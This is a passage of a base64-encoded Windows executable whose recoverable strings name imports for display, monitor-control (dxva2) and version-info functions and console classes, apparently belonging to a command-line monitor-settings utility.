A8FwAAMDEAACA+QAAoU4BANJOAQAQYgEASGIBAHtiAQC5YgEAEWMBAERjAQB0YwEAqGMBAM1jAQAAAAAAAAAAAAAAAAAAAAAAIgWTGQIAAAAs60EAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAA/////wBiQQAAAAAACGJBACIFkxkBAAAAYOtBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAP////9AYkEA/v///wAAAADU////AAAAAP7///8AAAAAhDNAAAAAAAD+////AAAAANT///8AAAAA/v///wAAAADYNUAAAAAAAP7///8AAAAA1P///wAAAAD+////AAAAAKY3QAAAAAAA/v///wAAAADM////AAAAAP7///8OOkAAIjpAAAAAAAD+////AAAAAND///8AAAAA/v///wAAAABqPUAAAAAAAP7///8AAAAAxP///wAAAAD+////AAAAAANCQAAAAAAA/v///wAAAADM////AAAAAP7///8AAAAA20ZAAAAAAAD+////AAAAANT///8AAAAA/v///wAAAADnR0AAAAAAAP7///8AAAAAzP///wAAAAD+////AAAAAMpIQAAAAAAAAAAAAJRIQAD+////AAAAANT///8AAAAA/v///wAAAADdSUAAAAAAAP7///8AAAAA1P///wAAAAD+////AAAAAHRbQAAAAAAA/v///wAAAADY////AAAAAP7///8AAAAALmRAAAAAAAD+////AAAAANj///8AAAAA/v///0RlQABIZUAAAAAAAP7///8AAAAA2P///wAAAAD+////EGVAABRlQAAAAAAA/v///wAAAADY////AAAAAP7///97bEAAl2xAAAAAAAD+////AAAAANj///8AAAAA/v///wAAAACkcEAA/v///wAAAACwcEAA/v///wAAAADY////AAAAAP7///8AAAAA3nFAAP7///8AAAAA7XFAAP7///8AAAAAfP///wAAAAD+////AAAAADR1QAAAAAAA/v///wAAAADQ////AAAAAP7///8AAAAA4npAAAAAAAD+////AAAAANj///8AAAAA/v///wAAAABwe0AAAAAAAP7///8AAAAA2P///wAAAAD+////eYdAAIyHQAAAAAAA/v///wAAAAC8////AAAAAP7///8AAAAAoYlAAAAAAAD+////AAAAANT///8AAAAA/v///wAAAAB8jUAAAAAAAP7///8AAAAA0P///wAAAAD+////AAAAAPeOQAAAAAAA/v///wAAAADU////AAAAAP7///8AAAAAHpRAAAAAAAD+////AAAAANj///8AAAAA/v///wAAAABvlUAAAAAAAP7///8AAAAAzP///wAAAAD+////AAAAAKiZQAAAAAAA/v///wAAAADQ////AAAAAP7///8AAAAAkJpAAAAAAAD+////AAAAANT///8AAAAA/v///wAAAACo2UAAAAAAAP7///8AAAAAyP///wAAAAD+////AAAAAI7lQAAAAAAA/v///wAAAADQ////AAAAAP7///8AAAAA2QJBAAAAAAAgE0IAAAAAAP////8AAAAABAAAAAAAAAABAAAAXO9BAAAAAAAAAAAAAAAAAHjvQQAiBZMZAQAAALTvQQAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAD/////cGJBACIFkxkCAAAA4O9BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAP////+jYkEAAAAAAK5iQQAiBZMZAwAAABTwQQAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAD/////8GJBAAAAAAD7YkEAAQAAAAZjQQAiBZMZAQAAAFDwQQAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAD/////OWNBACIFkxkBAAAAfPBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAP////9sY0EAIgWTGQEAAADE8EEAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAA5P///wAAAAC4/f//AAAAAP7///+/N0EA0TdBAP////+gY0EAAAAAAP7///8AAAAA0P///wAAAAD+////AAAAAEBfQQAAAAAABV9BAA9fQQD+////AAAAALD///8AAAAA/v///wAAAADzVEEAAAAAAEdUQQBRVEEA/v///wAAAADY////AAAAAP7///9nXEEAa1xBAAAAAAD+////AAAAANj///8AAAAA/v///zxTQQBFU0EAQAAAAAAAAAAAAAAAoFVBAP////8AAAAA/////wAAAAAAAAAAAAAAAAEAAAABAAAAXPFBACIFkxkCAAAAbPFBAAEAAAB88UEAAAAAAAAAAAAAAAAAAQAAAAAAAAD+////AAAAANT///8AAAAA/v///yJeQQAmXkEAAAAAAIJTQQAAAAAA5PFBAAIAAADw8UEADPJBAAAAAAAQFEIAAAAAAP////8AAAAADAAAAGdTQQAAAAAAMBRCAAAAAAD/////AAAAAAwAAADZYEEA2PIBAAAAAAAAAAAAtPcBABBwAQBc9AEAAAAAAAAAAAD6+AEAlHEBAMjyAQAAAAAAAAAAAET5AQAAcAEAJPQBAAAAAAAAAAAAePkBAFxxAQAw9AEAAAAAAAAAAAA6+gEAaHEBALT0AQAAAAAAAAAAABD7AQDscQEApPQBAAAAAAAAAAAAXPsBANxxAQAAAAAAAAAAAAAAAAAAAAAAAAAAADr5AQAe+QEABvkBAAAAAADG9QEA2PUBAOj1AQD49QEACPYBABr2AQAw9gEARPYBAFL2AQBk9gEAdPYBAIr2AQCg9gEArvYBALz2AQDK9gEA6PYBAPz2AQAO9wEAIPcBADL3AQBO9wEAZvcBAHz3AQCi9wEAWv4BAE7+AQA+/gEALv4BABr+AQAI/gEA/P0BAPD9AQDm/QEA1P0BAMr9AQC8/QEArv0BAKL9AQCO/QEAcv0BAGL9AQBI/QEALv0BABT9AQD6/AEA7PwBALb1AQCg9QEAiPUBAHj1AQBs9QEAXPUBAEr1AQA89QEAFPUBAAL1AQDU9AEA9vQBAOr0AQDc9AEAkPcBAOD8AQDQ/AEAtPwBAKD8AQCK/AEAdPwBAF78AQBQ/AEAPvwBACz8AQAY/AEABPwBAOT7AQDS+wEAwvsBAKr7AQCS+wEAfPsBAGj7AQBq/gEAAAAAAFL5AQBk+QEAAAAAACj6AQCE+QEAkPkBAKb5AQAW+gEAAvoBAOz5AQDe+QEA0PkBALj5AQAAAAAAIvgBAAb4AQDu9wEAMvgBANj3AQDC9wEA7vgBAN74AQDO+AEAuvgBAKj4AQCc+AEAivgBAHT4AQBm+AEAWvgBAEj4AQAAAAAASvsBADT7AQAa+wEAAAAAAJL6AQBG+gEAcPoBAMT6AQCs+gEA9voBANr6AQAAAAAAsgRTbGVlcADSAkhlYXBSZUFsbG9jAMsCSGVhcEFsbG9jAM8CSGVhcEZyZWUAAEoCR2V0UHJvY2Vzc0hlYXAAAOMCSW5pdGlhbGl6ZUNyaXRpY2FsU2VjdGlvbkFuZFNwaW5Db3VudADOAkhlYXBEZXN0cm95ALEDUmFpc2VFeGNlcHRpb24AAAICR2V0TGFzdEVycm9yAADUAkhlYXBTaXplAADKAERlY29kZVBvaW50ZXIA0QBEZWxldGVDcml0aWNhbFNlY3Rpb24AFAJHZXRNb2R1bGVGaWxlTmFtZVcAAHMEU2V0TGFzdEVycm9yAACxBFNpemVvZlJlc291cmNlAABUA0xvY2tSZXNvdXJjZQAAQQNMb2FkUmVzb3VyY2UAAE4BRmluZFJlc291cmNlVwBNAUZpbmRSZXNvdXJjZUV4VwDTAkhlYXBTZXRJbmZvcm1hdGlvbgAAwAFHZXRDdXJyZW50UHJvY2VzcwBSAENsb3NlSGFuZGxlAEUCR2V0UHJvY0FkZHJlc3MAAAMCR2V0TG9jYWxUaW1lAADFAUdldEN1cnJlbnRUaHJlYWRJZAAAwQFHZXRDdXJyZW50UHJvY2Vzc0lkAGIBRnJlZUxpYnJhcnkAjwBDcmVhdGVGaWxlVwDWAERlbGV0ZUZpbGVXAKUEU2V0VW5oYW5kbGVkRXhjZXB0aW9uRmlsdGVyABgCR2V0TW9kdWxlSGFuZGxlVwAAXgFGb3JtYXRNZXNzYWdlVwAAyAFHZXREYXRlRm9ybWF0VwAAlwJHZXRUaW1lRm9ybWF0VwAAHQFFeHBhbmRFbnZpcm9ubWVudFN0cmluZ3NXAL8BR2V0Q3VycmVudERpcmVjdG9yeVcAAHACR2V0U3lzdGVtRGlyZWN0b3J5VwCBAENyZWF0ZURpcmVjdG9yeVcAAD4DTG9hZExpYnJhcnlFeFcAAGMCR2V0U3RhcnR1cEluZm9XAEtFUk5FTDMyLmRsbAAA5QBFbnVtRGlzcGxheURldmljZXNXAOYARW51bURpc3BsYXlNb25pdG9ycwDqAEVudW1EaXNwbGF5U2V0dGluZ3NXAAAlAENoYW5nZURpc3BsYXlTZXR0aW5nc0V4VwAAfAJTZW5kTWVzc2FnZVcAAC0BR2V0Rm9yZWdyb3VuZFdpbmRvdwCWAUdldFdpbmRvd0xvbmdXAABkAUdldFBhcmVudAAnAUdldERsZ0l0ZW0AAAADVW5ob29rV2luZG93c0hvb2tFeAAcAENhbGxOZXh0SG9va0V4AAAxAENoYXJOZXh0VwBfAUdldE1vbml0b3JJbmZvVwAaAk1vbml0b3JGcm9tV2luZG93AJwBR2V0V2luZG93UmVjdADGAlNldFdpbmRvd1BvcwAAjgFHZXRXaW5kb3cAVVNFUjMyLmRsbAAAUQBDaGVja1Rva2VuTWVtYmVyc2hpcAAAIABBbGxvY2F0ZUFuZEluaXRpYWxpemVTaWQAACABRnJlZVNpZABBRFZBUEkzMi5kbGwAACEBU2hlbGxFeGVjdXRlRXhXAMMAU0hHZXRGb2xkZXJQYXRoVwAAU0hFTEwzMi5kbGwAUAFTdHJUcmltVwAAPwBQYXRoQ29tcGFjdFBhdGhFeFcAAJUAUGF0aFN0cmlwUGF0aFcAAIkAUGF0aFJlbW92ZUV4dGVuc2lvblcAADQAUGF0aEFwcGVuZFcAcQBQYXRoSXNVTkNXAABVAFBhdGhHZXREcml2ZU51bWJlclcAOABQYXRoQ2Fub25pY2FsaXplVwBlAFBhdGhJc1JlbGF0aXZlVwBdAFBhdGhJc0ZpbGVTcGVjVwBTSExXQVBJLmRsbAARAEdldE51bWJlck9mUGh5c2ljYWxNb25pdG9yc0Zyb21ITU9OSVRPUgATAEdldFBoeXNpY2FsTW9uaXRvcnNGcm9tSE1PTklUT1IACQBHZXRNb25pdG9yQ2FwYWJpbGl0aWVzAAAIAEdldE1vbml0b3JCcmlnaHRuZXNzAAALAEdldE1vbml0b3JDb250cmFzdAAAEABHZXRNb25pdG9yVGVjaG5vbG9neVR5cGUAAAYARGVzdHJveVBoeXNpY2FsTW9uaXRvcnMAZHh2YTIuZGxsAAUAR2V0RmlsZVZlcnNpb25JbmZvU2l6ZVcABgBHZXRGaWxlVmVyc2lvbkluZm9XAA4AVmVyUXVlcnlWYWx1ZVcAAFZFUlNJT04uZGxsAAADSXNEZWJ1Z2dlclByZXNlbnQAigNPdXRwdXREZWJ1Z1N0cmluZ1cAAO4ARW50ZXJDcml0aWNhbFNlY3Rpb24AADkDTGVhdmVDcml0aWNhbFNlY3Rpb24AAOoARW5jb2RlUG9pbnRlcgCsAUdldENvbnNvbGVNb2RlAAA1AkdldE51bWJlck9mQ29uc29sZUlucHV0RXZlbnRzAIsDUGVla0NvbnNvbGVJbnB1dEEAtQNSZWFkQ29uc29sZUlucHV0QQA9BFNldENvbnNvbGVNb2RlAACHAUdldENvbW1hbmRMaW5lVwAZAUV4aXRQcm9jZXNzABcCR2V0TW9kdWxlSGFuZGxlRXhXAABnA011bHRpQnl0ZVRvV2lkZUNoYXIAEQVXaWRlQ2hhclRvTXVsdGlCeXRlALgDUmVhZENvbnNvbGVJbnB1dFcABANJc1Byb2Nlc3NvckZlYXR1cmVQcmVzZW50AGQCR2V0U3RkSGFuZGxlAAAlBVdyaXRlRmlsZQDzAUdldEZpbGVUeXBlAKcDUXVlcnlQZXJmb3JtYW5jZUNvdW50ZXIAeQJHZXRTeXN0ZW1UaW1lQXNGaWxlVGltZQDaAUdldEVudmlyb25tZW50U3RyaW5nc1cAAGEBRnJlZUVudmlyb25tZW50U3RyaW5nc1cAhwRTZXRTdGRIYW5kbGUAANMEVW5oYW5kbGVkRXhjZXB0aW9uRmlsdGVyAADABFRlcm1pbmF0ZVByb2Nlc3MAAMUEVGxzQWxsb2MAAMcEVGxzR2V0VmFsdWUAyARUbHNTZXRWYWx1ZQDGBFRsc0ZyZWUACgNJc1ZhbGlkQ29kZVBhZ2UAaAFHZXRBQ1AAADcCR2V0T0VNQ1AAAHIBR2V0Q1BJbmZvAGkCR2V0U3RyaW5nVHlwZVcAAFcBRmx1c2hGaWxlQnVmZmVycwAAmgFHZXRDb25zb2xlQ1AAACQFV3JpdGVDb25zb2xlVwAYBFJ0bFVud2luZAAtA0xDTWFwU3RyaW5nVwAAZwRTZXRGaWxlUG9pbnRlckV4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP////8AAAAAQCVCAAAAAABAJUIAAQEAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAACAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP//AAAAAAAATuZAu7EZv0QAAAAAAAAAAAEAAAAWAAAAAgAAAAIAAAADAAAAAgAAAAQAAAAYAAAABQAAAA0AAAAGAAAACQAAAAcAAAAMAAAACAAAAAwAAAAJAAAADAAAAAoAAAAHAAAACwAAAAgAAAAMAAAAFgAAAA0AAAAWAAAADwAAAAIAAAAQAAAADQAAABEAAAASAAAAEgAAAAIAAAAhAAAADQAAADUAAAACAAAAQQAAAA0AAABDAAAAAgAAAFAAAAARAAAAUgAAAA0AAABTAAA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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUAAwAAADgAAIAGAAAAqAAAgA4AAADIAACAEAAAAOAAAIAYAAAA+AAAgAAAAAAAAAAAAAAAAAAADAABAAAAEAEAgAIAAAAoAQCAAwAAAEABAIAEAAAAWAEAgAUAAABwAQCABgAAAIgBAIAHAAAAoAEAgAgAAAC4AQCACQAAANABAIAKAAAA6AEAgAsAAAAAAgCADAAAABgCAIAAAAAAAAAAAAAAAAAAAAIAmAYAADACAICZBgAASAIAgAAAAAAAAAAAAAAAAAAAAQAFAAAAYAIAgAAAAAAAAAAAAAAAAAAAAQABAAAAeAIAgAAAAAAAAAAAAAAAAAAAAQABAAAAkAIAgAAAAAAAAAAAAAAAAAAAAQAJBAAAqAIAAAAAAAAAAAAAAAAAAAAAAQAJBAAAuAIAAAAAAAAAAAAAAAAAAAAAAQAJBAAAyAIAAAAAAAAAAAAAAAAAAAAAAQAJBAAA2AIAAAAAAAAAAAAAAAAAAAAAAQAJBAAA6AIAAAAAAAAAAAAAAAAAAAAAAQAJBAAA+AIAAAAAAAAAAAAAAAAAAAAAAQAJBAAACAMAAAAAAAAAAAAAAAAAAAAAAQAJBAAAGAMAAAAAAAAAAAAAAAAAAAAAAQAJBAAAKAMAAAAAAAAAAAAAAAAAAAAAAQAJBAAAOAMAAAAAAAAAAAAAAAAAAAAAAQAJBAAASAMAAAAAAAAAAAAAAAAAAAAAAQAJBAAAWAMAAAAAAAAAAAAAAAAAAAAAAQAJBAAAaAMAAAAAAAAAAAAAAAAAAAAAAQAJBAAAeAMAAAAAAAAAAAAAAAAAAAAAAQAJBAAAiAMAAAAAAAAAAAAAAAAAAAAAAQAJBAAAmAMAAAAAAAAAAAAAAAAAAAAAAQAJBAAAqAMAANBGAgBoBgAAAAAAAAAAAAA4TQIA6AIAAAAAAAAAAAAAIFACAOgBAAAAAAAAAAAAAAhSAgAoAQAAAAAAAAAAAAAwUwIAqA4AAAAAAAAAAAAA2GECAKgIAAAAAAAAAAAAAIBqA